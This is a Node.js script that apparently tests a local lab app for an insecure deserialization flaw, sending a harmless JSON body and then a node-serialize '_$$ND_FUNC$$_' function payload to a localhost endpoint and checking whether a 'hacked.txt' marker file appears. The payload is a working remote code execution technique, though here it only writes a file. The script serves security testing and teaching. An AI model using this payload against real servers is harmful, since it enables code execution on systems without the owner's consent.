import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const baseURL = 'http://localhost:5000/deserialize';

// Simulate __dirname in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const hackedPaths = [
  path.join(__dirname, '../website-react/server/hacked.txt'),
  path.join(__dirname, '../website-vulnerable/server/hacked.txt')
];

// Step 1: Clean up any existing hacked.txt
for (const p of hackedPaths) {
  if (fs.existsSync(p)) {
    fs.unlinkSync(p);
    console.log(`🧹 Removed existing ${p}`);
  }
}

// Step 2: Safe payload
const safePayload = {
  data: JSON.stringify({
    name: 'TestUser',
    message: 'This is a harmless payload'
  })
};

// Step 3: Exploit payload
const exploitPayload = {
  data: JSON.stringify({
    exploit: "_$$ND_FUNC$$_function() { " +
             "const fs = require('fs'); " +
             "const now = new Date().toISOString(); " +
             "fs.writeFileSync('hacked.txt', `💥 PWNED at ${now}\\n`); " +
             "console.log('💥 Exploit executed'); }"
  })
};

(async () => {
  try {
    console.log('📦 Sending safe payload...');
    const safeRes = await axios.post(baseURL, safePayload);
    console.log('✅ Safe Response:', safeRes.data);
  } catch (err) {
    console.error('❌ Safe payload failed:', err.message);
  }

  try {
    console.log('\n💣 Sending exploit payload...');
    const exploitRes = await axios.post(baseURL, exploitPayload);
    console.log('✅ Exploit Response:', exploitRes.data);
  } catch (err) {
    console.error('❌ Exploit failed:', err.message);
  }

  // Step 4: Check if hacked.txt was created
  console.log('\n🔍 Checking for hacked.txt...');
  let found = false;
  for (const p of hackedPaths) {
    if (fs.existsSync(p)) {
      const contents = fs.readFileSync(p, 'utf-8');
      console.log(`💥 File created at ${p}`);
      console.log('--------------------------');
      console.log(contents);
      console.log('--------------------------');
      found = true;
    }
  }

  if (!found) {
    console.log('✅ No file created. System appears secure.');
  }
})();
